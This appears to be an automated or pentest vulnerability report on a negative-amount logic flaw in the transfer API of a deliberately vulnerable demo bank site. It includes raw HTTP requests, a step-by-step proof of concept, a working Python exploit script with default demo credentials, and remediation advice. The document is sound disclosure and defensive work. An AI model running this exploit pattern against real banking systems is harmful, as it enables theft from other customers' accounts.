# Negative transfer amount in POST /api/transfer reverses fund flow, allowing theft from arbitrary accounts

**ID:** vuln-0011
**Severity:** MEDIUM
**Found:** 2026-09-20 21:48:25 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /api/transfer
**CWE:** CWE-1284
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The REST endpoint `POST /api/transfer` does not validate the sign of `transferAmount`. A negative amount inverts the debit/credit, so a transfer "to" a third-party account actually removes funds from that account and credits the caller. The equivalent web endpoint (`POST /bank/doTransfer`) rejects negative amounts, so only the REST API is affected. The same endpoint also lacks any insufficient-funds or upper-bound validation.

## Evidence

Own controlled account `800011`, victim account `800001`, negative amount:

```http
POST /api/transfer HTTP/1.1
Host: demo.testfire.net
Authorization: Bearer <jsmith token>
Content-Type: application/json

{"toAccount":"800001","fromAccount":"800011","transferAmount":"-1"}
```

```http
HTTP/1.1 200 OK
{"success":"-1.0 was successfully transferred from Account 800011 into Account 800001 at 9/20/26 4:46 PM."}
```

Resulting balances (negative transfer reversed the flow — attacker gained, victim lost):

```text
800001 (victim): $1002626437452.38 -> $1002626437451.38   (delta -1.00)
800011 (own)   : $0.99             -> $1.99               (delta +1.00)
```

Web endpoint rejects the same input, proving the API gap:

```text
POST /bank/doTransfer  transferAmount=-25
-> ERROR: Transfer amount is invalid   (balances unchanged)
```

Supporting: no insufficient-funds or upper-bound check either —

```text
transfer 1,000,000 from an account holding $342   -> succeeded, balance became -$999,658.00
transfer 1e30 and 29-digit amounts                -> accepted (balance set to ~1e30)
```

## Impact

An authenticated user can move funds OUT of any third-party account by naming it as the destination and sending a negative `transferAmount`, crediting their own account. This is unauthorized modification of another customer's balance (funds theft) reachable without any special role. The absence of an amount bound additionally permits nonsensical balances and floating-point corruption of the ledger.

## Counterevidence

Checked whether a control neutralizes this: the web endpoint (`/bank/doTransfer`) rejects negative amounts with `ERROR: Transfer amount is invalid`, so the flaw is API-only — but the direct exploit was executed against `/api/transfer` and the balances moved, so the API path genuinely lacks the check. Confirmed the destination (800001) is a third-party account and that its balance decreased while the attacker's increased, ruling out a same-account/same-user artifact. No amount-sign validation, WAF, or secondary confirmation was observed on `/api/transfer`. The demo nature limits real-world financial impact, but the value-integrity invariant is demonstrably violated.

## Confidence Rationale

Reproduced live with concrete before/after balances on both sides; no execution gap.

## What Would Change This Severity

If the REST API were the only transfer path (or web clients also sent negative amounts through), impact would be the same; confirmation that the affected balances represent real value rather than synthetic demo data would raise severity. Adding a strict positive-amount validation would eliminate the issue.

## Technical Analysis

`POST /api/transfer` parses `transferAmount` as a number but applies no sign, finiteness, or range validation. The transfer is implemented as "subtract amount from `fromAccount`, add amount to `toAccount`"; a negative amount therefore inverts the operation and debits the destination. The equivalent web `TransferServlet` performs the sign check (`if (!(amt > 0))` server-side equivalent returns "Transfer amount is invalid"), so the omission is specific to the REST layer. There is likewise no insufficient-funds check (a transfer larger than the balance succeeds and drives the balance negative) and no upper bound (values up to `1e30` are accepted), which is consistent with the amount being stored as a Java `double`.

## Proof of Concept

1. Authenticate as `jsmith` via `POST /api/login` and capture the Bearer token.
2. Note the balances of an account the attacker controls (`fromAccount`, e.g. `800011`) and a victim account (`toAccount`, e.g. `800001`, not owned by the caller).
3. Send `POST /api/transfer` with body `{"toAccount":"800001","fromAccount":"800011","transferAmount":"-1"}` and the `Authorization: Bearer <token>` header.
4. Observe HTTP 200 with a success message.
5. Re-read both balances: the caller's account increased by 1 and the victim's account decreased by 1 — the negative amount reversed the intended direction.
6. For contrast, POST a negative amount to `/bank/doTransfer`; it is rejected with `ERROR: Transfer amount is invalid`.

```python
import requests, re

BASE = "http://demo.testfire.net"
tok = requests.post(BASE + "/api/login",
                    json={"username": "jsmith", "password": "demo1234"},
                    timeout=20).json()["Authorization"]
H = {"Authorization": "Bearer " + tok, "Content-Type": "application/json"}

def bal(acct):
    t = requests.get(BASE + "/api/account/" + acct, headers=H, timeout=20).text
    return re.search(r'"balance":"([^"]+)"', t).group(1)

before_victim, before_own = bal("800001"), bal("800011")

# negative amount "to" the victim actually steals FROM the victim
r = requests.post(BASE + "/api/transfer", headers=H,
                  json={"toAccount": "800001", "fromAccount": "800011",
                        "transferAmount": "-1"}, timeout=20)
print(r.status_code, r.text)                       # -> 200 {"success":"-1.0 was successfully transferred ..."}

print("victim 800001:", before_victim, "->", bal("800001"))   # decreased by 1
print("own    800011:", before_own,   "->", bal("800011"))    # increased by 1
```

## Remediation

Reject any `transferAmount` that is not a finite number strictly greater than zero, and enforce a sane maximum and precision, on the server for both the REST API and the web servlet. Use a decimal/fixed-point money type rather than a binary double, and validate the parsed value (reject NaN/Infinity/overflow) before it reaches the ledger. As defence in depth, recompute the signed direction of the debit/credit from the validated positive amount rather than from a possibly-negative user value. Also enforce an insufficient-funds rule if overdrafts are not intended.

## Assumptions

Assumes an authenticated account (jsmith/demo1234, documented default). Assumes the attacker knows or can enumerate the victim account number. No victim interaction required.
